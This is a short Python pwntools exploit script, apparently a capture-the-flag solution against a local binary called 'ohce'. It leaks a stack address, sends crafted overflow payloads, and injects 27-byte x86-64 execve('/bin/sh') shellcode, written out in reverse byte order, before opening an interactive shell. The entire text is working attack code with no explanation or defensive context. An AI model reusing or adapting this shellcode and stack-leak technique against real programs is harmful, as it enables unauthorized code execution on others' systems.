from pwn import *

context.log_level='debug'

s=process('./ohce')

#27byte
shellcode="\x31\xc0\x48\xbb\xd1\x9d\x96\x91"
shellcode+="\xd0\x8c\x97\xff\x48\xf7\xdb\x53"
shellcode+="\x54\x5f\x99\x52\x57\x54\x5e\xb0"
shellcode+="\x3b\x0f\x05"

s.recvuntil('> ')
s.sendline('1')

s.sendline('A'*95)

s.recvuntil('\n')

stack_leak=u64(s.recv(8))
stack_leak=stack_leak-0x2d0a000000000000

print hex(stack_leak)

s.recvuntil('> ')
s.sendline('1')

payload1=p64(stack_leak-43)
payload1+='B'*(95-len(payload1))
s.sendline(payload1)

raw_input('$ ')
print s.recvuntil('> ')
raw_input()
s.sendline('2')

use=p64(stack_leak-0x78)[::-1][2::]
payload=use
payload+=shellcode[::-1]
payload+='C'*(63-len(payload))

raw_input('')
print hex(stack_leak)

s.sendline(payload)
raw_input()
s.interactive()

